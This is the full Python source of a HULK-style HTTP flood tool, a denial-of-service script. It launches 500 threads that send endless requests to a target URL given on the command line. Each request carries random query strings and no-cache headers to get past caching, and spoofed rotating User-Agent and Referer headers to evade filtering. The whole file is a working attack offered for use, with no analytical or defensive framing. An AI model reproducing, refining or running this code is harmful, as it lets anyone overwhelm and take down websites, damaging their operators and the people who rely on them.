# HULK - HTTP Unbearable Load King (Python 3 Fixed)
import urllib.request
import sys
import threading
import random
import re

# global params
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

def useragent_list():
    global headers_useragents
    headers_useragents.extend([
        'Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/103.0.0.0 Safari/537.36',
        'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.5.22 Version/10.51'
    ])
    return headers_useragents

def referer_list():
    global headers_referers
    headers_referers.extend([
        'http://www.google.com/?q=',
        'http://www.bing.com/search?q=',
        'http://' + host + '/'
    ])
    return headers_referers

def buildblock(size):
    return ''.join([chr(random.randint(65, 90)) for _ in range(size)])

def usage():
    print('---------------------------------------------------')
    print('USAGE: python3 hulk.py <url>')
    print('Optional: add "safe" after URL to stop after HTTP 500 response')
    print('---------------------------------------------------')

def httpcall(url):
    useragent_list()
    referer_list()
    code = 0
    param_joiner = '&' if '?' in url else '?'
    full_url = url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10))
    req = urllib.request.Request(full_url)
    req.add_header('User-Agent', random.choice(headers_useragents))
    req.add_header('Cache-Control', 'no-cache')
    req.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    req.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
    req.add_header('Keep-Alive', str(random.randint(110,120)))
    req.add_header('Connection', 'keep-alive')
    req.add_header('Host', host)
    try:
        urllib.request.urlopen(req)
    except urllib.error.HTTPError as e:
        set_flag(1)
        print('Response Code 500')
        code = 500
    except urllib.error.URLError:
        sys.exit()
    else:
        inc_counter()
        urllib.request.urlopen(req)
    return code

class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if code == 500 and safe == 1:
                    set_flag(2)
        except Exception as ex:
            pass

class MonitorThread(threading.Thread):
    def run(self):
        global request_counter
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter:
                print(f"{request_counter} Requests Sent")
                previous = request_counter
        if flag == 2:
            print("\n-- HULK Attack Finished --")

# Execute
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1].lower() == "help":
        usage()
        sys.exit()
    else:
        print("-- HULK Attack Started --")
        if len(sys.argv) == 3 and sys.argv[2] == "safe":
            set_safe()
        url = sys.argv[1]
        if url.count("/") == 2:
            url += "/"
        m = re.search('(https?\://)?([^/]*)/?.*', url)
        host = m.group(2)
        for i in range(500):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
